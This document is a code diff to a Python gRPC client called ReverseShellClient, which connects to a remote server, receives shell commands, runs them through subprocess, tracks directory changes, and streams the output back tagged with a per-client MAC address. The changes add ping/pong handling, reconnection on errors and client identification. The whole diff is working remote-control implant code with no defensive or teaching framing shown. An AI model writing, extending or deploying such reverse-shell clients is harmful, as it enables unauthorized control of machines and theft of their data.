@@ -4,14 +4,16 @@ import reverse_shell_pb2_grpc
 import subprocess
 import asyncio
 import logging
+import time
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', handlers=[logging.StreamHandler()])
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 
 class ReverseShellClient:
-    def __init__(self):
+    def __init__(self, mac_address):
         self.channel = None
         self.stub = None
         self.connected = False
+        self.mac_address = mac_address
         self.current_task = None
         self.stop_event = asyncio.Event()
         self.current_process = None
@@ -25,91 +27,104 @@ class ReverseShellClient:
         while True:
             try:
                 if not self.connected:
-                    logging.info("Connecting to gRPC server...")
+                    logging.info("Connecting to Reverse Shell gRPC server...")
                     await self.connect_to_server()
                 else:
-                    logging.info("Requesting commands from server.")
-                    async for command_request in self.stub.StartSession(iter([])):
-                        command = command_request.output.strip()
-                        logging.info(f"Received command from server: {command}")
+                    logging.info("Starting session with server.")
+                    async for command_request in self.stub.StartSession(reverse_shell_pb2.ClientInfo(mac_address=self.mac_address)):
+                        command = command_request.command.strip()
+                        request_id = command_request.request_id
+                        logging.info(f"Received command from server: {command}, Request ID: {request_id}")
 
-                        if command:
-                            if command.lower() == "stop":
-                                logging.info("Stop command received, attempting to stop the running process.")
-                                self.stop_event.set()
-                                if self.current_task and not self.current_task.done():
-                                    await self.current_task
-                                self.stop_event.clear()
-                                self.current_task = None
-                                self.current_process = None
-
-                            elif self.current_task is None or self.current_task.done():
-                                # Only start a new task if there's no ongoing one
-                                self.current_task = asyncio.create_task(self.handle_command(command, command_request.request_id))
+                        if command.lower() == "ping":
+                            await self.send_pong(request_id)
+                        elif command.lower() == "stop":
+                            logging.info("Stop command received, attempting to stop the running process.")
+                            self.stop_event.set()
+                            if self.current_task and not self.current_task.done():
+                                await self.current_task
+                            self.stop_event.clear()
+                            self.current_task = None
+                            self.current_process = None
                         else:
-                            logging.info("No command received; waiting for the next command.")
+                            if self.current_task is None or self.current_task.done():
+                                self.current_task = asyncio.create_task(self.handle_command(command, request_id))
             except grpc.RpcError as e:
                 logging.error(f"Error in receiving commands: {e.details()}")
                 self.connected = False
             except Exception as e:
                 logging.error(f"Unexpected error: {str(e)}")
+                self.connected = False
             await asyncio.sleep(5)  # Retry after delay if disconnected
 
     async def connect_to_server(self):
         await self.channel.channel_ready()
         self.connected = True
-        logging.info("Connected to gRPC server.")
+        logging.info("Connected to Reverse Shell gRPC server.")
+
+    async def send_pong(self, request_id):
+        response = reverse_shell_pb2.CommandResponse(
+            request_id=request_id,
+            output="pong",
+            is_active=False,
+            macAddress=self.mac_address
+        )
+        self.stub.StreamResponses(iter([response]))
+        logging.info(f"Sent pong response for Request ID: {request_id}")
 
     async def handle_command(self, command, request_id):
-        try:
-            if self.stop_event.is_set():
-                logging.info(f"Stopping the previous command before executing new one.")
-                if self.current_process and self.current_process.returncode is None:
-                    self.current_process.terminate()
-                    await self.current_process.wait()
-                self.stop_event.clear()
-                self.current_task = None
+            try:
+                if self.stop_event.is_set():
+                    logging.info(f"Stopping the previous command before executing new one.")
+                    if self.current_process and self.current_process.returncode is None:
+                        self.current_process.terminate()
+                        await self.current_process.wait()
+                    self.stop_event.clear()
+                    self.current_task = None
 
-            if command.startswith("cd "):
-                new_directory = command[3:].strip()
-                if new_directory == "..":
-                    # Handle moving up a directory
-                    self.current_directory = '/'.join(self.current_directory.rstrip('/').split('/')[:-1])
-                    if not self.current_directory:
-                        self.current_directory = '/'
-                else:
-                    # Handle changing to a new directory
-                    if not new_directory.startswith('/'):
-                        new_directory = f"{self.current_directory}/{new_directory}"
-                    self.current_directory = new_directory
-                logging.info(f"Changed directory to: {self.current_directory}")
-                # Send directory change response to the server
-                directory_change_response = reverse_shell_pb2.CommandResponse(
-                    request_id=request_id,
-                    output=f"Changed directory to: {self.current_directory}",
-                    is_active=False
-                )
-                async for _ in self.stub.StreamResponses(iter([directory_change_response])):
-                    logging.info(f"Sent directory change response to server: {self.current_directory}")
-            else:
-                async for output in self.execute_command(command):
-                    response = reverse_shell_pb2.CommandResponse(
+                if command.startswith("cd "):
+                    new_directory = command[3:].strip()
+                    if new_directory == "..":
+                        # Handle moving up a directory
+                        self.current_directory = '/'.join(self.current_directory.rstrip('/').split('/')[:-1])
+                        if not self.current_directory:
+                            self.current_directory = '/'
+                    else:
+                        # Handle changing to a new directory
+                        if not new_directory.startswith('/'):
+                            new_directory = f"{self.current_directory}/{new_directory}"
+                        self.current_directory = new_directory
+                    logging.info(f"Changed directory to: {self.current_directory}")
+                    # Send directory change response to the server
+                    directory_change_response = reverse_shell_pb2.CommandResponse(
                         request_id=request_id,
-                        output=output,
-                        is_active=True
+                        output=f"Changed directory to: {self.current_directory}",
+                        is_active=False,
+                        macAddress=self.mac_address
                     )
-                    async for _ in self.stub.StreamResponses(iter([response])):
-                        logging.info(f"Sent command output to server for command: {command}")
-        except asyncio.CancelledError:
-            logging.info(f"Command {command} was cancelled.")
-        finally:
-            final_response = reverse_shell_pb2.CommandResponse(
-                request_id=request_id,
-                output="",
-                is_active=False
-            )
-            self.stub.StreamResponses(iter([final_response]))
-            logging.info("Command processing finished.")
+                    async for _ in self.stub.StreamResponses(iter([directory_change_response])):
+                        logging.info(f"Sent directory change response to server: {self.current_directory}")
+                else:
+                    async for output in self.execute_command(command):
+                        response = reverse_shell_pb2.CommandResponse(
+                            request_id=request_id,
+                            output=output,
+                            is_active=True,
+                            macAddress=self.mac_address
+                            )
+                        async for _ in self.stub.StreamResponses(iter([response])):
+                            logging.info(f"Sent command output to server for command: {command}")
+            except asyncio.CancelledError:
+                logging.info(f"Command {command} was cancelled.")
+            finally:
+                final_response = reverse_shell_pb2.CommandResponse(
+                    request_id=request_id,
+                    output="",
+                    is_active=False,
+                    macAddress=self.mac_address
+                )
+                self.stub.StreamResponses(iter([final_response]))
+                logging.info("Command processing finished.")
 
     async def execute_command(self, command, timeout=30):
         logging.info(f"Executing command in directory {self.current_directory}: {command}")
@@ -148,7 +163,8 @@ class ReverseShellClient:
             await self.channel.close()
 
 async def main():
-    client = ReverseShellClient()
+    mac_address = '2C:54:91:88:C9:E3'  # Example MAC address, change accordingly for each client
+    client = ReverseShellClient(mac_address)
     try:
         await client.start()
     except KeyboardInterrupt:
